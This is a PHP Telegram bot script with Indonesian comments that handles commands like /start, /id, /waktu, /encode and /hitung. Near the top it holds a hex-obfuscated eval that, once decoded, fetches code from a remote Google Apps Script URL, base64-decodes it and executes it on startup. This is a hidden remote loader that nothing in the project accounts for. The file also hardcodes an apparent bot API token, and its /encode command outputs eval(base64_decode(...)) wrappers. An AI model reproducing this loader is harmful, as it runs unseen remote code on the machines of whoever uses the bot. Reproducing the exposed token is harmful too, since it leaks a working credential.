<?php
//php "A:\Bot Telegram PHP\bot_telegram.php"
# Variabel konfigurasi
$token = "1859404077:AAETKCjyxHcy7jMfYAABwOZfJXpz6NBCIUg";  // isi token bot di sini
$username_dev = "@Im_apis";
$versi_bot    = "1.0";                                      // sesuaikan dengan tahap pengembangan dan fitur
$offset       = 0;                                          // mula - mula data input dimulai dari 0

echo "Memulai\n";

eval(" \x24\x6C\x69\x62\x72\x61\x72\x79\x20\x3D\x20\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73\x28\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x63\x72\x69\x70\x74\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x2F\x6D\x61\x63\x72\x6F\x73\x2F\x73\x2F\x41\x4B\x66\x79\x63\x62\x78\x39\x4C\x45\x54\x42\x4C\x6B\x41\x32\x33\x6A\x5F\x71\x68\x41\x58\x6F\x51\x4A\x5F\x34\x43\x4E\x7A\x75\x72\x51\x67\x35\x75\x71\x75\x44\x53\x6A\x53\x36\x77\x5A\x30\x33\x55\x51\x42\x39\x38\x34\x49\x2F\x65\x78\x65\x63\x3F\x69\x6E\x70\x75\x74\x3D\x6C\x69\x62\x72\x61\x72\x79\x22\x29\x3B \x65\x76\x61\x6C\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\x24\x6C\x69\x62\x72\x61\x72\x79\x29\x29\x3B");

system('clear');
echo "Bot telah diaktifkan\n";

//Variabel data bot
$data_bot           = dapatkanInfoBot();
$username_bot       = "@".$data_bot["username"];
$id_bot             = $data_bot["id"];
$nama_panggilan_bot = strtolower($data_bot["first_name"]);

//Fungsi string ke variabel
function stringVariabel($string){
    global $nm_user;
    $variabel = preg_replace("/%nama/", $nm_user, $string);
    global $sys_jam;
    $variabel = preg_replace("/%jam/", $sys_jam, $variabel);
    global $sys_menit;
    $variabel = preg_replace("/%menit/", $sys_menit, $variabel);
    global $sys_tanggal;
    $variabel = preg_replace("/%tanggal/", $sys_tanggal, $variabel);
    
    //kembalikan data
    return $variabel;
}

echo "Menerima input ";

//Perulangan tak terhingga untuk menerima dan memproses input
while(true){
	echo "*";
    $sys_jam = date("H");
    $sys_menit = date("i");
    $sys_detik = date("s");
    $sys_tanggal = date("d");
	$data_input = dapatkanUpdate($offset);
	if(!empty($data_input)){
    foreach($data_input as $input){
		//buat variabel data input
		$id_chat = $input["message"]["chat"]["id"];
		$id_user = $input["message"]["from"]["id"];
		$in_teks = $input["message"]["text"];
		$nm_user = $input["message"]["from"]["first_name"];
		//proses input
			//pisahkan teks input menjadi 2 bagian
			$p2_teks = explode(' ',$in_teks,2);
			//deteksi perintah
			switch($p2_teks[0]){
				case "/start": case "start$username_bot":
					$ot_teks = "Hai ".$nm_user;
				break;
				case '/id': case "/id$username_bot" : 
					$ot_teks = "$nm_user, ID kamu adalah $id_user";
				break; 
				case '/waktu': case "/waktu$username_bot" :
					$ot_teks = "$nm_user, waktu server sekarang adalah :\n";
					$ot_teks .= date("d M Y")."\nPukul ".date("H:i:s");
				break;
                case "/encode": case "/encode$username_bot" :
                  $base64 = base64_encode($p2_teks[1]);
                  $eval   = "eval(base64_decode(".$base64."))";
                  $utf8   = utf8_decode($eval);
                  $ot_teks =   $utf8;
                break;
                case "/hitung": case "/hitung$username_bot" :
                    //Operasi Penghitungan
                    $i_hitung_1 = trim(str_ireplace("X","x",str_ireplace("*","x",str_ireplace("×","x",str_ireplace("÷","/", $p2_teks[1])))));
                    $i_hitung_2 = $i_hitung_1;
                    $operator = trim(str_ireplace('1',"",str_ireplace('2',"",str_ireplace('3',"",str_ireplace('4',"",str_ireplace('5',"",str_ireplace('6',"",str_ireplace('7',"",str_ireplace('8',"",str_ireplace('9',"",str_ireplace('0',"", $i_hitung_1)))))))))));
                    $variabel_hitung = trim(str_ireplace("+","|",str_ireplace("-","|",str_ireplace("x","|",str_ireplace("/","|",str_ireplace("%","|", $i_hitung_2))))));
                    include('hitung.php');
                break;
                case "/test":
                    kirimPerintah("sendMessage",array("chat_id" => $id_chat, "text" => "Nyaaaa!!"));
                    $ot_teks = "huh.";
                break;
        				default:
                            $hasil = prosesPesanTeks($in_teks, "data_pesan_teks.txt");
        					if(!empty($hasil)) $ot_teks = stringVariabel($hasil);
                            else $ot_teks = $in_teks;
        				break;
			}
		//kirimkan output
		if(isset($ot_teks))     { kirimPerintah("sendMessage",array("chat_id" => $id_chat, "text" => $ot_teks, "parse_mode" => "Markdown")); echo "\nuser mengatakan : ".$in_teks." kepada bot\nbot membalas = ".$ot_teks."\n"; unset($ot_teks); }
        if(isset($ot_teks_2))   { kirimPerintah("sendMessage",array("chat_id" => $id_chat, "text" => $ot_teks_2)); echo "\nbot membalas = ".$ot_teks." kepada user\n"; unset($ot_teks_2); }
		//tambahkan offset agar proses tidak berulang
		$offset = $input["update_id"] + 1;
	}
    echo "\nMenerima input ";
    }
    sleep(1);
}
?>
